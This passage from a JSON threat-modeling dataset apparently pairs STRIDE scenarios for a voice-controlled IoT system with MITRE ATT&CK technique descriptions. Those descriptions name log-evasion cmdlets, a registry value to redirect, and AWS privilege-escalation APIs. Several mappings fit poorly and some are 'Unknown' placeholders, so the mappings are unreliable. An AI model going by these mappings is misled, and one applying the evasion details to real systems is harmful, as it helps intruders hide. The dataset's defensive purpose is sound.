                "description": "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)\n(Citation: Microsoft O365 Admin Roles) \n\nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136) or modify a victim-owned account.(Citation: Invictus IR DangerDev 2024)",
                "id": "attack-pattern--2dbbdcd5-92cf-44c0-aea2-fe24783a6bc3",
                "technique_id": "T1098.003"
            }
        }
    ]
},
{
    "case_number": "1",
    "batch_number": "15",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate user to issue voice commands through the microphone.",
            "Assumptions": [
                {
                    "Assumption": "Voice recognition is not authenticated or uses weak authentication methods.",
                    "Role": "Security Designer",
                    "Condition": "Application design phase"
                },
                {
                    "Assumption": "The attacker has physical access to the environment where the device is placed.",
                    "Role": "Physical Security Manager",
                    "Condition": "Deployment phase"
                },
                {
                    "Assumption": "The attacker knows the type of commands that would elicit meaningful responses.",
                    "Role": "Attacker",
                    "Condition": "Reconnaissance phase"
                }
            ],
            "Potential Impact": "Potential unauthorized access to sensitive data and control over IoT devices.",
            "MITRE ATT&CK Keywords": [
                "impersonation",
                "voice commands",
                "authentication bypass",
                "IoT device control"
            ],
            "mitre_technique": {
                "name": "Impersonation",
                "description": "Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via [Phishing for Information](https://attack.mitre.org/techniques/T1598), [Phishing](https://attack.mitre.org/techniques/T1566), or [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary\u2019s ultimate goals, possibly against multiple victims. \n \nIn many cases of business email compromise or email fraud campaigns, adversaries use impersonation to defraud victims -- deceiving them into sending money or divulging information that ultimately enables [Financial Theft](https://attack.mitre.org/techniques/T1657).\n\nAdversaries will often also use social engineering techniques such as manipulative and persuasive language in email subject lines and body text such as `payment`, `request`, or `urgent` to push the victim to act quickly before malicious activity is detected. These campaigns are often specifically targeted against people who, due to job roles and/or accesses, can carry out the adversary\u2019s goal.\u202f\u202f \n \nImpersonation is typically preceded by reconnaissance techniques such as [Gather Victim Identity Information](https://attack.mitre.org/techniques/T1589) and [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591) as well as acquiring infrastructure such as email domains (i.e. [Domains](https://attack.mitre.org/techniques/T1583/001)) to substantiate their false identity.(Citation: CrowdStrike-BEC)\n \nThere is the potential for multiple victims in campaigns involving impersonation. For example, an adversary may [Compromise Accounts](https://attack.mitre.org/techniques/T1586) targeting one organization which can then be used to support impersonation against other entities.(Citation: VEC)",
                "id": "attack-pattern--c9e0c59e-162e-40a4-b8b1-78fab4329ada",
                "technique_id": "T1656"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a software tool to send fraudulent audio signals directly to the client-side application.",
            "Assumptions": [
                {
                    "Assumption": "The client-side application does not verify the origin of the audio signals.",
                    "Role": "Application Developer",
                    "Condition": "Development phase"
                },
                {
                    "Assumption": "Network traffic is not encrypted or uses weak encryption.",
                    "Role": "Network Security Engineer",
                    "Condition": "Network configuration phase"
                },
                {
                    "Assumption": "The attacker has the ability to capture and replay legitimate audio signals.",
                    "Role": "Attacker",
                    "Condition": "Attack execution phase"
                }
            ],
            "Potential Impact": "Potential execution of unauthorized actions and control over IoT devices.",
            "MITRE ATT&CK Keywords": [
                "man-in-the-middle",
                "replay attack",
                "audio signal injection",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker manipulates the client-side application to send unauthorized control requests to the IoT controller.",
            "Assumptions": [
                {
                    "Assumption": "The client-side application has exploitable vulnerabilities.",
                    "Role": "Security Tester",
                    "Condition": "Vulnerability assessment phase"
                },
                {
                    "Assumption": "The attacker has access to the client device or gains remote access.",
                    "Role": "Attacker",
                    "Condition": "Attack execution phase"
                },
                {
                    "Assumption": "Control requests are not verified or authenticated by the IoT controller.",
                    "Role": "IoT Controller Developer",
                    "Condition": "Development phase"
                }
            ],
            "Potential Impact": "Potential unauthorized access and manipulation of IoT devices.",
            "MITRE ATT&CK Keywords": [
                "client-side exploitation",
                "unauthorized control",
                "IoT device manipulation",
                "remote access"
            ],
            "mitre_technique": {
                "name": "Remote Access Software",
                "description": "An adversary may use legitimate desktop support and remote access software to establish an interactive command and control channel to target systems within networks. These services, such as `VNC`, `Team Viewer`, `AnyDesk`, `ScreenConnect`, `LogMein`, `AmmyyAdmin`, and other remote monitoring and management (RMM) tools, are commonly used as legitimate technical support software and may be allowed by application control within a target environment.(Citation: Symantec Living off the Land)(Citation: CrowdStrike 2015 Global Threat Report)(Citation: CrySyS Blog TeamSpy)\n\nRemote access software may be installed and used post-compromise as an alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary-controlled system.\n \nAdversaries may similarly abuse response features included in EDR and other defensive tools that enable remote access.\n\nInstallation of many remote access software may also include persistence (e.g., the software's installation routine creates a [Windows Service](https://attack.mitre.org/techniques/T1543/003)). Remote access modules/features may also exist as part of otherwise existing software (e.g., Google Chrome\u2019s Remote Desktop).(Citation: Google Chrome Remote Desktop)(Citation: Chrome Remote Desktop)",
                "id": "attack-pattern--4061e78c-1284-44b4-9116-73e4ac3912f7",
                "technique_id": "T1219"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and modifies voice commands being sent from the client-side application to the server-side application.",
            "Assumptions": [
                {
                    "Assumption": "Communication between client and server is not encrypted.",
                    "Role": "Network Security Engineer",
                    "Condition": "Network configuration phase"
                },
                {
                    "Assumption": "The attacker has access to the network channels used for communication.",
                    "Role": "Attacker",
                    "Condition": "Network attack phase"
                },
                {
                    "Assumption": "The server does not verify the authenticity of received commands.",
                    "Role": "Server-side Application Developer",
                    "Condition": "Development phase"
                }
            ],
            "Potential Impact": "Potential corruption and unauthorized manipulation of data and actions.",
            "MITRE ATT&CK Keywords": [
                "interception",
                "message tampering",
                "voice command modification",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains physical access to the IoT controller and alters its firmware to execute malicious commands.",
            "Assumptions": [
                {
                    "Assumption": "Physical access controls to the IoT controller are inadequate.",
                    "Role": "Physical Security Manager",
                    "Condition": "Deployment phase"
                },
                {
                    "Assumption": "The IoT controller allows firmware updates without proper authentication.",
                    "Role": "IoT Controller Developer",
                    "Condition": "Development phase"
                },
                {
                    "Assumption": "The attacker has the technical knowledge to modify firmware.",
                    "Role": "Attacker",
                    "Condition": "Attack preparation phase"
                }
            ],
            "Potential Impact": "Potential unauthorized control and operational disruption of IoT devices.",
            "MITRE ATT&CK Keywords": [
                "firmware manipulation",
                "unauthorized firmware update",
                "IoT controller",
                "physical access"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker compromises the client-side application and alters its codebase to perform malicious actions.",
            "Assumptions": [
                {
                    "Assumption": "The client-side application has vulnerabilities that can be exploited.",
                    "Role": "Security Tester",
                    "Condition": "Vulnerability assessment phase"
                },
                {
                    "Assumption": "The attacker can deploy malware on the client device.",
                    "Role": "Attacker",
                    "Condition": "Malware deployment phase"
                },
                {
                    "Assumption": "Code integrity checks are not performed during execution.",
                    "Role": "Application Developer",
                    "Condition": "Development phase"
                }
            ],
            "Potential Impact": "Potential data corruption and execution of unauthorized commands.",
            "MITRE ATT&CK Keywords": [
                "client-side exploitation",
                "code manipulation",
                "malicious actions",
                "malware deployment"
            ],
            "mitre_technique": {
                "name": "Indicator Blocking",
                "description": "An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting(Citation: Microsoft Lamin Sept 2017) or even disabling host-based sensors, such as Event Tracing for Windows (ETW)(Citation: Microsoft About Event Tracing 2018), by tampering settings that control the collection and flow of event telemetry.(Citation: Medium Event Tracing Tampering 2018) These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as [PowerShell](https://attack.mitre.org/techniques/T1059/001) or [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).\n\nFor example, adversaries may modify the `File` value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Security</code> to hide their malicious actions in a new or different .evtx log file. This action does not require a system reboot and takes effect immediately.(Citation: disable_win_evt_logging) \n\nETW interruption can be achieved multiple ways, however most directly by defining conditions using the [PowerShell](https://attack.mitre.org/techniques/T1059/001) <code>Set-EtwTraceProvider</code> cmdlet or by interfacing directly with the Registry to make alterations.\n\nIn the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.\n\nIn Linux environments, adversaries may disable or reconfigure log processing tools such as syslog or nxlog to inhibit detection and monitoring capabilities to facilitate follow on behaviors (Citation: LemonDuck).",
                "id": "attack-pattern--74d2a63f-3c7b-4852-92da-02d8fbab16da",
                "technique_id": "T1562.006"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having issued specific voice commands that led to certain actions or data manipulations.",
            "Assumptions": [
                {
                    "Assumption": "The system does not have adequate logging mechanisms to record command history.",
                    "Role": "System Architect",
                    "Condition": "Design phase"
                },
                {
                    "Assumption": "Voice authentication is not securely managed or logged.",
                    "Role": "Security Architect",
                    "Condition": "Authentication implementation phase"
                },
                {
                    "Assumption": "There is no mechanism for non-repudiation.",
                    "Role": "Application Developer",
                    "Condition": "Development phase"
                }
            ],
            "Potential Impact": "Potential loss of accountability and difficulty in investigation.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging deficiency",
                "voice command history",
                "authentication logging"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Logs of control requests sent to the IoT controller are altered to hide malicious activities.",
            "Assumptions": [
                {
                    "Assumption": "Logging mechanisms on the IoT controller are not tamper-resistant.",
                    "Role": "IoT Controller Developer",
                    "Condition": "Development phase"
                },
                {
                    "Assumption": "The attacker can gain unauthorized access to the IoT controller.",
                    "Role": "Attacker",
                    "Condition": "Attack execution phase"
                },
                {
                    "Assumption": "Logs are not regularly monitored.",
                    "Role": "System Administrator",
                    "Condition": "Operational phase"
                }
            ],
            "Potential Impact": "Potential loss of accountability and difficulty in incident response.",
            "MITRE ATT&CK Keywords": [
                "log tampering",
                "control request logging",
                "log manipulation",
                "IoT controller"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Cloud services used for storing sensitive data do not retain adequate logs, making it difficult to track actions.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services do not implement comprehensive logging.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Service design phase"
                },
                {
                    "Assumption": "The application relies on cloud storage for critical operations.",
                    "Role": "System Architect",
                    "Condition": "System design phase"
                },
                {
                    "Assumption": "Access to cloud logs is not properly secured.",
                    "Role": "Security Architect",
                    "Condition": "Authentication implementation phase"
                }
            ],
            "Potential Impact": "Potential challenge in forensic analysis and incident investigation.",
            "MITRE ATT&CK Keywords": [
                "cloud logging",
                "log retention",
                "cloud storage logs",
                "forensic analysis"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Cloud Logs",
                "description": "An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities.\n\nFor example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.(Citation: Following the CloudTrail: Generating strong AWS security signals with Sumo Logic) They may alternatively tamper with logging functionality \u2013 for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files.(Citation: AWS Update Trail)(Citation: Pacu Detection Disruption Module) In Office 365, an adversary may disable logging on mail collection activities for specific users by using the `Set-MailboxAuditBypassAssociation` cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user\u2019s license from an Enterprise E5 to an Enterprise E3 license.(Citation: Dark Reading Microsoft 365 Attacks 2021)",
                "id": "attack-pattern--cacc40da-4c9e-462c-80d5-fd70a178b12d",
                "technique_id": "T1562.008"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unencrypted communication channels between the client-side application and server-side application are intercepted by an attacker.",
            "Assumptions": [
                {
                    "Assumption": "Network traffic is not encrypted.",
                    "Role": "Network Security Engineer",
                    "Condition": "Network configuration phase"
                },
                {
                    "Assumption": "The attacker has access to the network.",
                    "Role": "Attacker",
                    "Condition": "Network attack phase"
                },
                {
                    "Assumption": "Sensitive information is transmitted over these channels.",
                    "Role": "System Architect",
                    "Condition": "System design phase"
                }
            ],
            "Potential Impact": "Potential unauthorized disclosure of sensitive user data.",
            "MITRE ATT&CK Keywords": [
                "network interception",
                "unencrypted traffic",
                "data manipulation",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains unauthorized access to cloud services storing sensitive user data.",
            "Assumptions": [
                {
                    "Assumption": "Cloud service credentials are not securely managed.",
                    "Role": "System Administrator",
                    "Condition": "Operational phase"
                },
                {
                    "Assumption": "The attacker gains access to cloud credentials.",
                    "Role": "Attacker",
                    "Condition": "Attack execution phase"
                },
                {
                    "Assumption": "Sensitive data is stored in the cloud without proper encryption.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Service design phase"
                }
            ],
            "Potential Impact": "Potential exposure and theft of sensitive user data.",
            "MITRE ATT&CK Keywords": [
                "cloud access",
                "credential compromise",
                "data theft",
                "cloud storage"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data processed by the server-side application is exposed due to inadequate access controls.",
            "Assumptions": [
                {
                    "Assumption": "Access controls on the server-side application are insufficient.",
                    "Role": "Application Developer",
                    "Condition": "Development phase"
                },
                {
                    "Assumption": "Sensitive data is not properly segmented and protected.",
                    "Role": "System Architect",
                    "Condition": "System design phase"
                },
                {
                    "Assumption": "The attacker can exploit vulnerabilities in the server-side application.",
                    "Role": "Attacker",
                    "Condition": "Vulnerability exploitation phase"
                }
            ],
            "Potential Impact": "Potential unauthorized access and leakage of sensitive data.",
            "MITRE ATT&CK Keywords": [
                "server access",
                "access control bypass",
                "data leakage",
                "server vulnerability"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the voice-based application with excessive voice commands, causing system overload.",
            "Assumptions": [
                {
                    "Assumption": "The system lacks rate-limiting mechanisms.",
                    "Role": "System Architect",
                    "Condition": "Design phase"
                },
                {
                    "Assumption": "The attacker has the resources to generate a large volume of requests.",
                    "Role": "Attacker",
                    "Condition": "Attack execution phase"
                },
                {
                    "Assumption": "Voice command processing is not distributed to handle high traffic.",
                    "Role": "System Administrator",
                    "Condition": "Operational phase"
                }
            ],
            "Potential Impact": "Potential disruption of service and unavailability of functionality.",
            "MITRE ATT&CK Keywords": [
                "flood attack",
                "rate limiting",
                "system overload",
                "resource exhaustion"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits vulnerabilities in the cloud services component to disrupt storage operations.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services have known vulnerabilities.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Service development phase"
                },
                {
                    "Assumption": "The attacker identifies and exploits these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Vulnerability exploitation phase"
                },
                {
                    "Assumption": "There is no redundancy in cloud storage handling.",
                    "Role": "System Architect",
                    "Condition": "Design phase"
                }
            ],
            "Potential Impact": "Potential disruption and unavailability of stored data.",
            "MITRE ATT&CK Keywords": [
                "cloud exploitation",
                "storage disruption",
                "data unavailability",
                "cloud service vulnerability"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker targets IoT devices with a distributed denial of service (DDoS) attack, causing them to go offline.",
            "Assumptions": [
                {
                    "Assumption": "IoT devices are exposed to the internet without adequate protection.",
                    "Role": "Network Security Engineer",
                    "Condition": "Deployment phase"
                },
                {
                    "Assumption": "The attacker has access to a botnet to perform the DDoS attack.",
                    "Role": "Attacker",
                    "Condition": "Attack execution phase"
                },
                {
                    "Assumption": "IoT devices have limited resources and cannot handle high traffic.",
                    "Role": "IoT Device Manufacturer",
                    "Condition": "Design phase"
                }
            ],
            "Potential Impact": "Potential unavailability and disruption of IoT device functionality.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "IoT device",
                "network attack",
                "online resources"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the client-side application to gain admin-level control.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerabilities exist in the client-side application.",
                    "Role": "Security Tester",
                    "Condition": "Vulnerability assessment phase"
                },
                {
                    "Assumption": "The application does not follow the principle of least privilege.",
                    "Role": "Application Developer",
                    "Condition": "Development phase"
                },
                {
                    "Assumption": "The attacker gains initial access through phishing or malware.",
                    "Role": "Attacker",
                    "Condition": "Attack execution phase"
                }
            ],
            "Potential Impact": "Potential unauthorized access and control over the entire application.",
            "MITRE ATT&CK Keywords": [
                "client-side exploitation",
                "privilege escalation",
                "phishing",
                "malware"
            ],
            "mitre_technique": {
                "name": "Rundll32",
